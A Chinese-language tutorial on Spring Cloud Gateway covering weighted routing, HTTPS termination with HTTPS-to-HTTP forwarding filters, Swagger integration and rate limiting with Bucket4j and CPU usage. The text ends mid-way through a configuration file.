org.springframework.cloud.gateway: TRACE org.springframework.http.server.reactive: DEBUG org.springframework.web.reactive: DEBUG reactor.ipc.netty: DEBUGmanagement: endpoints: web: exposure: include: \'*\' security: enabled: false 创建 Provider Service 工程里的测试控制器： 12345678910111213@RestControllerpublic class ProviderController { @GetMapping("/v1") public String v1() { return "version: v1"; } @GetMapping("/v2") public String v2() { return "version: v2"; }} 创建 Provider Service 工程里的启动主类： 1234567@SpringBootApplicationpublic class ProviderApplication { public static void main(String[] args) { SpringApplication.run(ProviderApplication.class, args); }} 创建 Provider Service 工程里的 application.yml 配置文件： 123456server: port: 9091spring: application: name: provider-service 测试结果： 依次启动 gateway-server、provider-service 应用 多次访问 http://127.0.0.1:9090/test ，会发现按权重配置返回对应的请求内容 Spring Cloud Gateway 的 HTTPS 使用大型互联网应用的生产环境基本是全站 HTTPS，常规的做法是通过 Nginx 来配置 SSL 证书。如果使用 Spring Cloud Gateway 作为 API 网关，统一管理所有 API 请求的入口和出口，此时 Spring Cloud Gateway 就需要支持 HTTPS。由于 Spring Cloud Gateway 是基于 Spring Boot 2.0 构建的，所以只需要将生成的 HTTPS 证书放到 Spring Cloud Gateway 应用的类路径下面即可。 HTTPS 案例下面将介绍如何在 Spring Cloud Gateway 中使用 HTTPS，其中各个模块的说明如下。由于本案例是基于上面的 “Gateway 服务发现的路由规则案例 “ 改造而来的，因此 micro-service-eureka、micro-service-provider-1、micro-service-provider-2 工程里的配置和代码不再累述，点击下载完整的案例代码。 模块 端口 说明 micro-service-gateway-https N/A 聚合父 Maven 工程 micro-service-eureka 9000 Eureka 注册中心 micro-service-gateway 9001 带有 HTTPS 证书的网关服务，使用 HTTPS 协议访问 micro-service-provider-1 9002 服务提供者，使用 HTTP 协议 micro-service-provider-2 9003 服务提供者，使用 HTTP 协议 创建 Micro Service Gateway 工程里的 pom.xml 配置文件： 1234567891011121314151617181920212223242526&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt; 创建 Micro Service Gateway 工程里的启动主类： 1234567@SpringBootApplicationpublic class GatewayServerApplication { public static void main(String[] args) { SpringApplication.run(GatewayServerApplication.class, args); }} 创建 Micro Service Gateway 工程里的 application.yml 配置文件，通过 key-store 指定 HTTPS 证书的路径： 12345678910111213141516171819202122232425262728server: port: 9001 ssl: enabled: true key-alias: spring key-password: spring key-store: classpath:self-signed.jks key-store-type: JKS key-store-provider: SUN key-store-password: springspring: application: name: gateway-server cloud: gateway: discovery: locator: enabled: true lower-case-service-id: trueeureka: client: service-url: defaultZone: http://127.0.0.1:9000/eureka instance: instance-id: gateway-server-${server.port} prefer-ip-address: true 测试结果： 依次启动 micro-service-eureka、micro-service-provider-1、micro-service-provider-2、micro-service-gateway 应用 通过 HTTPS 协议访问 https://127.0.0.1:9001/provider-service/provider/sayHello/Jim，会出现如下的错误： 123456789101112131415161718io.netty.handler.ssl.NotSslRecordException: not an SSL/TLS record: 485454502f312e3120343030200d0a5472616e736665722d456e636f646 ... at io.netty.handler.ssl.SslHandler.decodeJdkCompatible(SslHandler.java:1156) [netty-handler-4.1.25.Final.jar:4.1.25.Final] at io.netty.handler.ssl.SslHandler.decode(SslHandler.java:1221) [netty-handler-4.1.25.Final.jar:4.1.25.Final] at io.netty.handler.codec.ByteToMessageDecoder.decodeRemovalReentryProtection(ByteToMessageDecoder.java:489) ~[netty-codec-4.1.25.Final.jar:4.1.25.Final] at io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:428) ~[netty-codec-4.1.25.Final.jar:4.1.25.Final] at io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:265) ~[netty-codec-4.1.25.Final.jar:4.1.25.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) ~[netty-transport-4.1.25.Final.jar:4.1.25.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) ~[netty-transport-4.1.25.Final.jar:4.1.25.Final] at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) ~[netty-transport-4.1.25.Final.jar:4.1.25.Final] at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1434) ~[netty-transport-4.1.25.Final.jar:4.1.25.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) ~[netty-transport-4.1.25.Final.jar:4.1.25.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) ~[netty-transport-4.1.25.Final.jar:4.1.25.Final] at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:965) ~[netty-transport-4.1.25.Final.jar:4.1.25.Final] at io.netty.channel.epoll.AbstractEpollStreamChannel$EpollStreamUnsafe.epollInReady(AbstractEpollStreamChannel.java:808) ~[netty-transport-native-epoll-4.1.25.Final-linux-x86_64.jar:4.1.25.Final] at io.netty.channel.epoll.EpollEventLoop.processReady(EpollEventLoop.java:408) ~[netty-transport-native-epoll-4.1.25.Final-linux-x86_64.jar:4.1.25.Final] at io.netty.channel.epoll.EpollEventLoop.run(EpollEventLoop.java:308) ~[netty-transport-native-epoll-4.1.25.Final-linux-x86_64.jar:4.1.25.Final] at io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:884) ~[netty-common-4.1.25.Final.jar:4.1.25.Final] at java.lang.Thread.run(Thread.java:745) ~[na:1.8.0_102] HTTPS 转 HTTP 的问题上述错误出现的原因是通过 Spring Cloud Gateway 请求进来的协议是 HTTPS，而后端被代理的服务是 HTTP 协议的请求，所以当 Gateway 用 HTTPS 请求转发调用 HTTP 协议的服务时，就会出现 not an SSL/TLS record 的错误。本质上这是一个 Spring Cloud Gateway 将 HTTPS 请求转发调用 HTTP 服务的问题。由于服务的拆分，在微服务的应用集群中会存在很多服务提供者和服务消费者，而这些服务提供者和服务消费者基本都是部署在企业内网中，没必要全部加 HTTPS 进行调用。因此 Spring Cloud Gateway 对外的请求是 HTTPS，对后端代理服务的请求可以是 HTTP。通过 Debug 调试源码分析，LoadBalancerClientFilter.filter() 方法如下： 123456789URI uri = exchange.getRequest().getURI();String overrideScheme = null;if (schemePrefix != null) { overrideScheme = url.getScheme();}URI requestUrl = this.loadBalancer.reconstructURI(new LoadBalancerClientFilter.DelegatingServiceInstance(instance, overrideScheme), uri);log.trace("LoadBalancerClientFilter url chosen: " + requestUrl);exchange.getAttributes().put(ServerWebExchangeUtils.GATEWAY_REQUEST_URL_ATTR, requestUrl); 从上面的代码可以看出，LoadBalancer 对 HTTP 请求进行封装，如果从 Spring Cloud Gateway 进来的请求是 HTTPS，它就用 HTTPS 封装，如果是 HTTP 就用 HTTP 封装，而且没有预留 任何扩展修改的接口，只能通过自定义 Global Filter 的方式对其修改。下面介绍两种修改方法，在实践中任选其中一种即可。 官方 Issues 说明 https://github.com/spring-cloud/spring-cloud-gateway/issues/378 https://github.com/spring-cloud/spring-cloud-gateway/issues/160 第一种解决方案在 LoadBalancerClientFilter 执行之前将 HTTPS 修改为 HTTP 协议： 123456789101112131415161718192021222324252627282930313233343536373839@Componentpublic class HttpsToHttpFilter implements GlobalFilter, Ordered { private static final int HTTPS_TO_HTTP_FILTER_ORDER = 10099; @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { URI originalUri = exchange.getRequest().getURI(); ServerHttpRequest request = exchange.getRequest(); ServerHttpRequest.Builder mutate = request.mutate(); String forwardedUri = request.getURI().toString(); if (forwardedUri != null &amp;&amp; forwardedUri.startsWith("https")) { try { URI mutatedUri = new URI("http", originalUri.getUserInfo(), originalUri.getHost(), originalUri.getPort(), originalUri.getPath(), originalUri.getQuery(), originalUri.getFragment()); mutate.uri(mutatedUri); } catch (Exception e) { throw new IllegalStateException(e.getMessage(), e); } } ServerHttpRequest build = mutate.build(); return chain.filter(exchange.mutate().request(build).build()); } /** * 由于LoadBalancerClientFilter的order是10100 * 要在LoadBalancerClientFilter执行之前将Https修改为Http，需要设置order为10099 * @return */ @Override public int getOrder() { return HTTPS_TO_HTTP_FILTER_ORDER; }} 第二种解决方案在 LoadBalancerClientFilter 执行之后将 HTTPS 修改为 HTTP，拷贝 RibbonUtils 中的 upgradeconnection 方法来自定义全局过滤器： 12345678910111213141516171819202122232425262728293031323334353637@Componentpublic class HttpSchemeFilter implements GlobalFilter, Ordered { private static final int HTTPS_TO_HTTP_FILTER_ORDER = 10101; @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { Object uriObj = exchange.getAttributes().get(GATEWAY_REQUEST_URL_ATTR); if (uriObj != null) { URI uri = (URI) uriObj; uri = this.upgradeConnection(uri, "http"); exchange.getAttributes().put(GATEWAY_REQUEST_URL_ATTR, uri); } return chain.filter(exchange); } private URI upgradeConnection(URI uri, String scheme) { UriComponentsBuilder uriComponentsBuilder = UriComponentsBuilder.fromUri(uri).scheme(scheme); if (uri.getRawQuery() != null) { // When building the URI, UriComponentsBuilder verify the allowed characters and does not // support the \'+\' so we replace it for its equivalent \'%20\'. // See issue https://jira.spring.io/browse/SPR-10172 uriComponentsBuilder.replaceQuery(uri.getRawQuery().replace("+", "%20")); } return uriComponentsBuilder.build(true).toUri(); } /** * 由于LoadBalancerClientFilter的order是10100，所以设置HttpSchemeFilter的的order是10101 * 在LoadBalancerClientFilter之后将https修改为http * @return */ @Override public int getOrder() { return HTTPS_TO_HTTP_FILTER_ORDER; }} Spring Cloud Gateway 集成 SwaggerSwagger 是一个可视化 API 测试工具，可以和应用完美融合。通过声明接口注解的方式，可以方便快捷地获取 API 调试界面进行测试。Zuul 可以很方便地与 Swagger 整合在一起，由于 Spring Cloud Finchley 版是基于 Spring Boot 2.0 的，而 Spring Cloud Gateway 的底层是基于 WebFlux 实现的，且经验证，WebFlux 和 Swagger 不兼容。如果按照 Zuul 集成 Swagger 的方式，应用启动的时候会报错。下面将介绍 Spring Cloud Gateway 如何集成 Swagger，其中各个模块的说明如下。由于本案例是基于上面的 “Gateway 服务发现的路由规则案例 “ 改造而来的，因此 micro-service-eureka 工程里的配置和代码不再累述，点击下载完整的案例代码。 模块 端口 说明 micro-service-gateway-swagger N/A 聚合父 Maven 工程 micro-service-eureka 9000 Eureka 注册中心 micro-service-gateway 9001 基于 Spring Cloud Gateway 的网关服务 micro-service-provider-1 9002 服务提供者 micro-service-provider-2 9003 服务提供者 1. 创建 Micro Service Gateway 工程创建 Micro Service Gateway 工程里的 pom.xml 配置文件： 123456789101112131415161718192021222324252627282930313233343536&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt; 创建 Micro Service Gateway 工程里的 SwaggerProvider 类，因为 Swagger 暂不支持 WebFlux 项目，所以不能在 Gateway 中配置 SwaggerCoufig，需要编写 GatewaySwaggerProvider 实现 SwaggerResourcesProvider 接口，用于获取 SwaggerResources： 12345678910111213141516171819202122232425262728293031323334353637383940/** * @Primary注解的实例优先于其他实例被注入 */@Primary@Componentpublic class GatewaySwaggerProvider implements SwaggerResourcesProvider { private final RouteLocator routeLocator; private final GatewayProperties gatewayProperties; public static final String API_URI = "/v2/api-docs"; public GatewaySwaggerProvider(RouteLocator routeLocator, GatewayProperties gatewayProperties) { this.routeLocator = routeLocator; this.gatewayProperties = gatewayProperties; } @Override public List&lt;SwaggerResource&gt; get() { List&lt;SwaggerResource&gt; resources = new ArrayList&lt;&gt;(); List&lt;String&gt; routes = new ArrayList&lt;&gt;(); //取出Spring Cloud Gateway中的route routeLocator.getRoutes().subscribe(route -&gt; routes.add(route.getId())); //结合application.yml中的路由配置，只获取有效的route节点 gatewayProperties.getRoutes().stream().filter(routeDefinition -&gt; routes.contains(routeDefinition.getId())) .forEach(routeDefinition -&gt; routeDefinition.getPredicates().stream() .filter(predicateDefinition -&gt; ("Path").equalsIgnoreCase(predicateDefinition.getName())) .forEach(predicateDefinition -&gt; resources.add(swaggerResource(routeDefinition.getId(), predicateDefinition.getArgs().get(NameUtils.GENERATED_NAME_PREFIX + "0") .replace("/**", API_URI))))); return resources; } private SwaggerResource swaggerResource(String name, String location) { SwaggerResource swaggerResource = new SwaggerResource(); swaggerResource.setName(name); swaggerResource.setLocation(location); swaggerResource.setSwaggerVersion("2.0"); return swaggerResource; }} 创建 Micro Service Gateway 工程里的 Swagger-Resource 端点，因为没有在 Gateway 中配置 SwaggerConfig，但是运行 Swagger-UI 的时候需要依赖一些接口，所以需要建立相应的 Swagger-Resource 端点： 123456789101112131415161718192021222324252627282930313233@RestController@RequestMapping("/swagger-resources")public class SwaggerHandler { @Autowired(required = false) private SecurityConfiguration securityConfiguration; @Autowired(required = false) private UiConfiguration uiConfiguration; private final SwaggerResourcesProvider swaggerResources; @Autowired public SwaggerHandler(SwaggerResourcesProvider swaggerResources) { this.swaggerResources = swaggerResources; } @GetMapping("/configuration/security") public Mono&lt;ResponseEntity&lt;SecurityConfiguration&gt;&gt; securityConfiguration() { return Mono.just(new ResponseEntity&lt;&gt;( Optional.ofNullable(securityConfiguration).orElse(SecurityConfigurationBuilder.builder().build()), HttpStatus.OK)); } @GetMapping("/configuration/ui") public Mono&lt;ResponseEntity&lt;UiConfiguration&gt;&gt; uiConfiguration() { return Mono.just(new ResponseEntity&lt;&gt;( Optional.ofNullable(uiConfiguration).orElse(UiConfigurationBuilder.builder().build()), HttpStatus.OK)); } @GetMapping("") public Mono&lt;ResponseEntity&gt; swaggerResources() { return Mono.just((new ResponseEntity&lt;&gt;(swaggerResources.get(), HttpStatus.OK))); }} 创建 Micro Service Gateway 工程里的 GwSwaggerHeaderFilter 类，由于在路由规则为 admin/test/{a}/{b} 时，Swagger 界面上会显示为 test/{a}/{b}，缺少了 /admin 这个路由节点。通过 Debug 断点调试发现，Swagger 会根据 X-Forwarded-Prefix 这个 Header 来获取 BasePath，因此需要将它添加到接口路径与 Host 之间才能正常工作。但是 Gateway 在做转发的时候并没有将这个 Header 添加到 Request 上，从而导致接口调试出现 404 错误。为了解决该问题，需要在 Gateway 中编写一个过滤器来添加这个 Header。特别注意，Spring Boot 版本为 2.0.6 以上的可以跳过这一步骤，最新源码里 Spring Boot 修复了该 Bug，已经默认添加上了这个 Header。 1234567891011121314151617181920@Componentpublic class GwSwaggerHeaderFilter extends AbstractGatewayFilterFactory { private static final String HEADER_NAME = "X-Forwarded-Prefix"; @Override public GatewayFilter apply(Object config) { return (exchange, chain) -&gt; { ServerHttpRequest request = exchange.getRequest(); String path = request.getURI().getPath(); if (!StringUtils.endsWithIgnoreCase(path, GatewaySwaggerProvider.API_URI)) { return chain.filter(exchange); } String basePath = path.substring(0, path.lastIndexOf(GatewaySwaggerProvider.API_URI)); ServerHttpRequest newRequest = request.mutate().header(HEADER_NAME, basePath).build(); ServerWebExchange newExchange = exchange.mutate().request(newRequest).build(); return chain.filter(newExchange); }; }} 创建 Micro Service Gateway 工程里的 application.yml 配置文件，添加上面编写的 GwSwaggerHeaderFilter 过滤器， URI 指定为 lb://provider-service-1，表示负载均衡到 provider-service-1 服务。由于 Swagger 发出请求 的 URL 都是以 /xxxx 开头，因此需要使用 StripPrefix 过滤器将第一个路由节点（/xxxx）去掉。 12345678910111213141516171819202122232425262728293031323334353637383940414243server: port: 9001spring: application: name: gateway-server cloud: gateway: discovery: locator: enabled: true lower-case-service-id: true routes: - id: provider-service-1 uri: lb://provider-service-1 predicates: - Path=/provider1/** filters: - GwSwaggerHeaderFilter - StripPrefix=1 - id: provider-service-2 uri: lb://provider-service-2 predicates: - Path=/provider2/** filters: - GwSwaggerHeaderFilter - StripPrefix=1eureka: client: service-url: defaultZone: http://127.0.0.1:9000/eureka instance: instance-id: gateway-server-${server.port} prefer-ip-address: truemanagement: endpoints: web: exposure: include: \'*\' security: enabled: false 2. 创建 Micro Service Provider 1 工程创建 Micro Service Provider 1 工程里的 pom.xml 配置文件： 1234567891011121314&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt; 创建 Micro Service Provider 1 工程里的 SwaggerConfig 类： 1234567891011121314151617181920212223@Configuration@EnableSwagger2public class SwaggerConfig { @Bean public Docket createRestApi() { return new Docket(DocumentationType.SWAGGER_2) .apiInfo(apiInfo()) .select() .apis(RequestHandlerSelectors.withMethodAnnotation(ApiOperation.class)) .paths(PathSelectors.any()) .build(); } private ApiInfo apiInfo() { return new ApiInfoBuilder() .title("Swagger API") .description("验证 Gateway 集成 Swagger 的效果") .termsOfServiceUrl("") .version("2.0") .build(); }} 创建 Micro Service Provider 1 工程里的测试控制类： 123456789101112131415@RestController@Api("provider-service-1 接口测试")@RequestMapping("/provider1")public class ProviderOneController { @ApiOperation(value = "计算+", notes = "加法") @ApiImplicitParams({ @ApiImplicitParam(name = "a", value = "数字a", required = true, dataType = "Long"), @ApiImplicitParam(name = "b", value = "数字b", required = true, dataType = "Long") }) @GetMapping("/{a}/{b}") public String get(@PathVariable Integer a, @PathVariable Integer b) { return "from provider service 1, the result is: " + (a + b); }} 创建 Micro Service Provider 1 工程里的 application.xml 配置文件： 1234567891011121314server: port: 9002spring: application: name: provider-service-1eureka: client: service-url: defaultZone: http://127.0.0.1:9000/eureka instance: instance-id: provider-service-1-${server.port} prefer-ip-address: true 3. 创建 Micro Service Provider 2 工程由于 Micro Service Provider 2 工程 与 Micro Service Provider 1 工程里的配置和代码都差不多，这里不再累述。 4. 测试结果 依次启动 micro-service-eureka、micro-service-provider-1、micro-service-provider-2、micro-service-gateway 应用 访问 http://127.0.0.1:9000/，查看各个服务是否都成功注册到 Eureka 访问 http://127.0.0.1:9001/swagger-ui.html，查看 Swagger 的界面是否正常工作，查看截图 在 Swagger 的界面上打开对应的 URL，输入测试数据，验证 Swagger 经过 Gateway 是否可以正常访问 Provider1 和 Provider2 服务的接口，查看截图 Spring Cloud Gateway 限流限流概述在开发高并发系统时可以用三把利器来保护系统：缓存、降级和限流。缓存的目的是提升系统访问速度和增大系统处理的容量，是抗高并发流量的 “银弹”；而降级是当服务出现问题或者影响到核心流程时，需要暂时将其屏蔽掉，待高峰过去之后或者问题解决后再打开；而有些场景并不能用缓存和降级来解决，比如稀缺资源（秒杀、抢购）、写服务（如评论、下单）、频繁的复杂查询等，因此需要有一种手段来限制这些场景的并发 / 请求量，即限流。限流的目的是通过对并发访问 / 请求进行限速或者对一个时间窗口内的请求进行限速来保护系统，一旦达到限制速率则可以拒绝服务（定向到错误页或友好的展示页）、排队或等待（比如秒杀、评论、下单等场景）、降级（返回兜底数据或默认数据）。主流的中间件都会有单机限流框架，一般支持两种限流模式：控制速率和控制并发。Spring Cloud Zuul 通过第三方扩展 spring-cloud-zuul-ratelimit 也可以支持限流。Spring Cloud Gateway 是一个 API 网关中间件，网关是所有请求流量的入口；特别是像天猫双十一、双十二等高并发场景下，当流量迅速剧增，网关除了要保护自身之外，还要限流保护后端应用。常见的限流算法有漏桶和令牌桶，计数器也可以进行粗暴限流实现。对于限流算法，可以参考 Guava 中的 RateLimiter、Bucket4j、RateLimitJ 等项目的具体实现。下面将介绍如何基于 Bucket4j、RequestRateLimiterGatewayFilterFactory 实现限流，点击下载完整的案例代码。 基于 Bucket4j 实现限流在 Spring Cloud Gateway 中实现限流比较简单，只需要编写一个过滤器就可以。下面介绍在 Spring Cloud Gateway 中使用 Bucket4j 实现限流，由于篇幅有限，只给出 Gateway Server 工程的核心代码和配置。 添加 Maven 依赖 123456789&lt;dependency&gt; &lt;groupId&gt;com.github.vladimir-bukhtoyarov&lt;/groupId&gt; &lt;artifactId&gt;bucket4j-core&lt;/artifactId&gt; &lt;version&gt;4.10.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt; 编写自定义过滤器对特定资源进行限流 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465/** * 针对客户端IP进行限流 */public class GatewayRateLimitFilterByIp implements GatewayFilter, Ordered { private final Logger log = LoggerFactory.getLogger(GatewayRateLimitFilterByIp.class); /** * 单机网关限流用一个ConcurrentHashMap来存储 bucket， * 如果是分布式集群限流的话，可以采用 Redis等分布式解决方案 */ private static final Map&lt;String, Bucket&gt; LOCAL_CACHE = new ConcurrentHashMap&lt;&gt;(); /** * 令牌桶的最大容量，即能装载令牌的最大数量 */ int capacity; /** * 每次补充令牌的数量 */ int refillTokens; /** * 补充令牌的时间间隔 */ Duration refillDuration; public GatewayRateLimitFilterByIp() { } public GatewayRateLimitFilterByIp(int capacity, int refillTokens, Duration refillDuration) { this.capacity = capacity; this.refillTokens = refillTokens; this.refillDuration = refillDuration; } private Bucket createNewBucket() { Refill refill = Refill.greedy(refillTokens, refillDuration); Bandwidth limit = Bandwidth.classic(capacity, refill); return Bucket4j.builder().addLimit(limit).build(); } @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { String ip = exchange.getRequest().getRemoteAddress().getAddress().getHostAddress(); Bucket bucket = LOCAL_CACHE.computeIfAbsent(ip, k -&gt; createNewBucket()); log.info("IP:{} ,令牌桶可用的令牌数量:{} ", ip, bucket.getAvailableTokens()); if (bucket.tryConsume(1)) { return chain.filter(exchange); } else { //当可用的令牌数为0时，进行限流，返回429状态码 exchange.getResponse().setStatusCode(HttpStatus.TOO_MANY_REQUESTS); return exchange.getResponse().setComplete(); } } @Override public int getOrder() { return -1000; } // 省略Get和Set方法 ...} 通过 Java 流式 API 的方式配置路由规则，其中 http://127.0.0.1:9091/sayHello/peter/ 对应的是后端的服务，这里不再累述 12345678910111213@Configurationpublic class CommonConfiguration { @Bean public RouteLocator rateLimitFilterByIp(RouteLocatorBuilder builder) { return builder.routes() .route(r -&gt; r.path("/rateLimit") .filters(f -&gt; f.filter(new GatewayRateLimitFilterByIp(10, 1, Duration.ofSeconds(1)))) .uri("http://127.0.0.1:9091/sayHello/peter/") .id("ratelimit_route")) .build(); }} 编写 application.yml 配置文件 123456server: port: 9090spring: application: name: gateway-server 测试结果 启动各个应用后，多次访问 http://127.0.0.1:9090/rateLimit，可以看到控制台输出如下日志信息。当可用的令牌数量为 0 时，Spring Cloud Gateway 中自定义的限流过滤器开始拒绝处理请求，直接返回 429 状态码（因为请求太多，限流返回 429 状态码）。 1234567891011121314c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:10c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:9c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:8c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:7c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:7c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:6c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:5c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:4c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:3c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:2c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:2c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:1c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:0c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:0 基于 CPU 的使用率进行限流在实际项目应用中对网关进行限流时，需要参考的因素比较多，可能会根据网络请求连接数、请求流量、CPU 使用率、内存使用率等进行流控。可以通过 Spring Boot Actuator 提供的 Metrics 获取当前 CPU 的使用情况，当 CPU 使用率高于某个阈值就开启限流，否则不开启限流。值得一提的是，在 Actuator 1.x 里可以通过 SystemPublicMetrics 来获取 CPU 的使用情况，但是在 Actuator 2.x 里只能通过 MetricsEndpoint 来获取。由于篇幅有限，下面只给出 Gateway Server 工程的核心代码和配置。 添加 Maven 依赖 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; 编写自定义过滤器对特定资源进行限流 1234567891011121314151617181920212223242526272829303132333435363738394041424344/** * 根据CPU的使用率限流 **/@Componentpublic class GatewayRateLimitFilterByCpu implements GatewayFilter, Ordered { @Autowired private MetricsEndpoint metricsEndpoint; private static final double MAX_USAGE = 0.50D; private static final String METRIC_NAME = "system.cpu.usage"; private final Logger log = LoggerFactory.getLogger(GatewayRateLimitFilterByCpu.class); @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { //获取网关服务所在机器的CPU使用情况 Double systemCpuUsage = metricsEndpoint.metric(METRIC_NAME, null) .getMeasurements() .stream() .filter(Objects::nonNull) .findFirst() .map(MetricsEndpoint.Sample::getValue) .filter(Double::isFinite) .orElse(0.0D); boolean isOpenRateLimit = systemCpuUsage &gt; MAX_USAGE; log.info("system.cpu.usage: {}, isOpenRateLimit:{} ", systemCpuUsage, isOpenRateLimit); if (isOpenRateLimit) { //当CPU的使用超过设置的最大阀值时，则开启限流 exchange.getResponse().setStatusCode(HttpStatus.TOO_MANY_REQUESTS); return exchange.getResponse().setComplete(); } else { return chain.filter(exchange); } } @Override public int getOrder() { return 0; }} 通过 Java 流式 API 的方式配置路由规则，其中 http://127.0.0.1:9091/sayHello/peter/ 对应的是后端的服务，这里不再累述 12345678910111213141516@Configurationpublic class CommonConfiguration { @Autowired private GatewayRateLimitFilterByCpu gatewayRateLimitFilterByCpu; @Bean public RouteLocator customerRouteLocator(RouteLocatorBuilder builder) { return builder.routes() .route(r -&gt; r.path("/rateLimit") .filters(f -&gt; f.filter(gatewayRateLimitFilterByCpu)) .uri("http://127.0.0.1:9091/sayHello/peter/") .id("rateLimit_route") ).build(); }} 编写 application.yml 配置文件 1234567891011121314server: port: 9093spring: application: name: 